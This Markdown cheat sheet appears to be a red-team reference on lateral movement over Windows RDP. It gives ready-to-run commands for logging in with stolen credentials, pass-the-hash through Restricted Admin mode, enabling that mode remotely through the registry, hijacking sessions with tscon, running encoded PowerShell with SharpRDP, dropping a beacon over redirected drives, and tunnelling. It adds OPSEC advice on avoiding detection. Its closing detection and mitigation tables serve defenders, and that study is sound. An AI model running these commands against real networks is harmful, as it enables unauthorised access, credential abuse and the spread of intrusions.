# RDP Lateral Movement

Remote Desktop Protocol (RDP) provides graphical remote access to Windows systems. Attackers use RDP for lateral movement through credential reuse, session hijacking, and restricted admin mode bypass.

## Techniques

1. **Standard RDP** — Log in with compromised credentials
2. **Restricted Admin Mode** — PtH via RDP (NTLM hash without password)
3. **Session Hijacking** — Take over existing RDP sessions via TSCon
4. **RDP File Transfer** — Copy tools and payloads over RDP drives
5. **RDP via Tunnel** — Tunnel RDP through SOCKS/SSH for network segmentation bypass

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges | RDP access granted (Remote Desktop Users group or Administrators) |
| Port | 3389 (TCP) |
| Service | Terminal Services must be running |
| Auth | NTLM or Kerberos |
| Restricted Admin Mode | Windows 8.1/2012R2+ with Restricted Admin enabled |

---

## Standard RDP Login

### xfreerdp — Linux RDP Client

```
# Password authentication
xfreerdp /v:192.168.1.100 /u:admin /p:'Password123!' /d:domain

# Hash authentication (Restricted Admin mode)
xfreerdp /v:192.168.1.100 /u:admin /pth:NTLM_HASH /d:domain

# With domain
xfreerdp /v:target.domain.local /u:DOMAIN\\admin /p:pass /d:DOMAIN

# Drive redirection (mount local share)
xfreerdp /v:target /u:admin /p:pass /drive:tools,/path/to/tools

# Clipboard redirection
xfreerdp /v:target /u:admin /p:pass +clipboard

# Full screen mode
xfreerdp /v:target /u:admin /p:pass /f

# Disable theming (performance)
xfreerdp /v:target /u:admin /p:pass -themes -wallpaper

# Ignore certificate
xfreerdp /v:target /u:admin /p:pass /cert:ignore

# Create RDP file for later use
xfreerdp /v:target /u:admin /p:pass /buildconfig
```

### rdesktop — Legacy RDP Client

```
rdesktop -u admin -p pass 192.168.1.100
rdesktop -u admin -d domain 192.168.1.100
rdesktop -u admin -p pass -g 1280x1024 -a 16 target
```

### Remmina / KRDC / GNOME Connections

```
# Remmina can load RDP files and store credentials
remmina -c file.rdp
```

### Windows MSTSC (Native Client)

```
# Open RDP connection dialog
mstsc.exe

# Load RDP file
mstsc.exe C:\path\to\connection.rdp

# Admin mode (RDP to console session)
mstsc.exe /admin

# Multi-monitor
mstsc.exe /span

# Specify credentials via RDP file
# Save as target.rdp and edit:
#   full address:s:target
#   username:s:DOMAIN\admin
#   prompt for credentials:i:0
```

---

## Restricted Admin Mode (PtH over RDP)

Restricted Admin Mode allows RDP authentication using NTLM hashes without requiring the user's password. The hash is used directly for Kerberos/NTLM challenge-response.

### Enabling Restricted Admin Mode

```
# On the target (requires admin):
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Check if Restricted Admin is enabled on target:
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin

# Via Group Policy (domain-wide):
# Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services > Remote Desktop Session Host > Security
```

### Connect with Restricted Admin

```
# xfreerdp with PtH (Restricted Admin)
xfreerdp /v:target /u:admin /pth:NTLM_HASH /d:domain +admin

# Use /admin-restrict flag
xfreerdp /v:target /u:admin /pth:HASH /d:dom /admin-restrict

# Mimikatz sekurlsa::pth for RDP
mimikatz # sekurlsa::pth /user:admin /domain:dom /ntlm:HASH /run:"mstsc.exe /restrictedAdmin"

# The opened RDP session uses the hash from the Mimikatz-injected process
```

**OPSEC**: Restricted Admin mode creates a logon with LogonType 10 (RemoteInteractive). The connection does not send the password — only the hash is used for network authentication.

### Enable Restricted Admin Remotely

```
# Via WMI
wmic /node:target process call create "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

# Via PowerShell
Invoke-Command -ComputerName target -ScriptBlock {
    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -PropertyType DWord -Force
}

# After enabling, connect with xfreerdp /pth
```

---

## Session Hijacking — TSCon / tscon.exe

If a user has an existing RDP session on a machine, an attacker with SYSTEM privileges can hijack it without knowing the user's password.

### Query Existing Sessions

```
# From the target machine (require admin)
query user
query session

# Output:
#  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
# >administrator         rdp-tcp#0          1   Active          .   7/8/2026 9:00
#  jdoe                  rdp-tcp#1          2   Disc            5   7/8/2026 8:30
```

### Connect to Existing Session

```
# Switch to session ID 2 (jdoe's disconnected session)
tscon 2

# This switches the current console session to the target session
# Requires SYSTEM privileges:
# Method 1: Run cmd as SYSTEM (PsExec -s)
PsExec -s cmd.exe
tscon 2

# Method 2: Use sc.exe to run tscon as SYSTEM
sc.exe create hijacksession binpath= "cmd /c tscon 2" type= own type= interact
sc.exe start hijacksession

# Method 3: PowerShell
Invoke-Command -ComputerName localhost -ScriptBlock { tscon 2 }
```

### Automatic Session Hijacking (SharpRDP)

```
SharpRDP.exe computername=target command=whoami
SharpRDP.exe computername=target username=DOMAIN\admin password=pass command="cmd /c whoami"
SharpRDP.exe computername=target username=DOMAIN\admin password=pass command="powershell -enc BASE64" connectmode=1
```

---

## RDP File Transfer

### Mount Local Drive in RDP Session

```
# xfreerdp — mount /tools folder as Z: drive on remote
xfreerdp /v:target /u:admin /p:pass /drive:tools,/home/user/tools

# In the RDP session, access at: \\tsclient\tools
```

### Copy Files via RDP

```
# From within RDP session (access client drives)
copy \\tsclient\tools\beacon.exe C:\Windows\Temp\

# PowerShell file copy
Copy-Item \\tsclient\tools\* C:\temp\ -Recurse
```

### RDP Drive Redirection via Group Policy

RDP drive redirection can be restricted via GPO:
`Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services > Remote Desktop Session Host > Device and Resource Redirection`

---

## Pass-the-Hash via RDP — Mimikatz

```
# Restricted Admin with Mimikatz
mimikatz # sekurlsa::pth /user:admin /domain:dom /ntlm:HASH /run:"mstsc /restrictedAdmin"

# The new mstsc process authenticates using the injected hash
# Target must have Restricted Admin mode enabled
```

---

## RDP over SSH Tunnel

```
# Create SSH tunnel to jump host
ssh -L 13389:target:3389 jumpuser@jumphost

# Connect through tunnel
xfreerdp /v:127.0.0.1:13389 /u:admin /p:pass
```

### RDP over SOCKS Proxy

```
# Create SOCKS proxy via SSH
ssh -D 1080 user@jumphost

# Use proxychains with xfreerdp
proxychains xfreerdp /v:target:3389 /u:admin /p:pass

# Or use chisel
chisel client -- socks jumphost:8080
```

---

## OPSEC Considerations

| Factor | Risk Level | Notes |
|--------|------------|-------|
| RDP logon events | High | LogonType 10 (RemoteInteractive) clearly indicates RDP |
| Session hijacking | Medium | tscon creates LogonType 3 (Network) transitions |
| Restricted Admin | Medium | LogonType 10 with restricted admin flag |
| Drive redirection | Low | tsclient mounts are common admin behavior |
| 3389 port | High | RDP on non-standard ports is suspicious |
| Multiple logons | High | Same user logged into multiple machines = pivot indicator |
| Idle session take-over | Critical | tscon from non-console user is highly suspicious |
| Clipboard | Low | No log for clipboard access |

---

## Detection

| Event ID | Source | Indication |
|----------|--------|------------|
| 4624 | Security | LogonType 10 (RemoteInteractive — RDP login) |
| 4624 | Security | LogonType 7 (Reconnect — session reconnection) |
| 4624 | Security | LogonType 3 (Network — Restricted Admin) |
| 4634 | Security | Logoff |
| 4647 | Security | User initiated logoff |
| 4648 | Security | Explicit credential logon |
| 4672 | Security | Admin logon (SeTcbPrivilege, SeDebugPrivilege) |
| 4778 | Security | Session reconnected to Window Station |
| 4779 | Security | Session disconnected from Window Station |
| 4800 | Security | Workstation locked |
| 4801 | Security | Workstation unlocked |
| 4825 | Security | RDP connection denied (Restricted Admin mode) |
| 98 | TerminalServices-RDPClient | RDP Client ActiveX |
| 98 | TerminalServices-RemoteConnectionManager | RDP connection |
| 21 | TerminalServices-SessionBroker | Session creation |
| 114 | TerminalServices-LicenseServer | RDP license |

**Detection logic**:
- LogonType 10 from unusual source IP = RDP lateral movement
- Multiple LogonType 10 events for the same user across different machines = lateral movement
- TSCon (session hijack) generates LogonType 3 from session transition
- LogonType 10 followed by LogonType 3 = lateral movement from RDP session
- 4825 (Restricted Admin denied) followed by attempts to enable it = attack
- RDP connections from non-admin workstations to servers = suspicious
- Session reconnection (4778) to existing session without prior disconnect

## Mitigation

| Control | Detail |
|---------|--------|
| Network Level Authentication (NLA) | Require pre-authentication before RDP session |
| Restricted Admin mode | Disable via GPO if not needed |
| RDP Guard | Block RDP from workstations to servers |
| RDP Logging | Enable Terminal Services logging (event forwarding) |
| Account restrictions | Limit which users have RDP access |
| RDP over VPN | Require VPN for external RDP access |
| Jump boxes | Centralize RDP access through hardened jump hosts |
| Smart card auth | Require smart card for RDP authentication |
| Session timeouts | Auto-disconnect idle sessions |

## When to Use RDP

- **Graphical access needed** — need to interact with GUI applications, UAC prompts, etc.
- **File transfer** — easiest way to transfer tools with drive redirection
- **Session hijacking** — another user has open RDP session with privileged access
- **Restricted Admin mode** — enables PtH when other techniques are blocked
- **Network segmentation** — RDP may be allowed through firewalls when other ports are blocked
- **Operational requirement** — client uses RDP for administration

## When NOT to Use RDP

- **Stealth required** — RDP generates LogonType 10, which is heavily audited
- **Limited bandwidth** — RDP consumes significant network resources
- **No GUI required** — PowerShell Remoting or WMI are more efficient
- **Restricted Admin disabled** — cannot use PtH; need password
- **Target is a server core** — No GUI, RDP not available
- **Only need command execution** — RDP is overkill for a single command
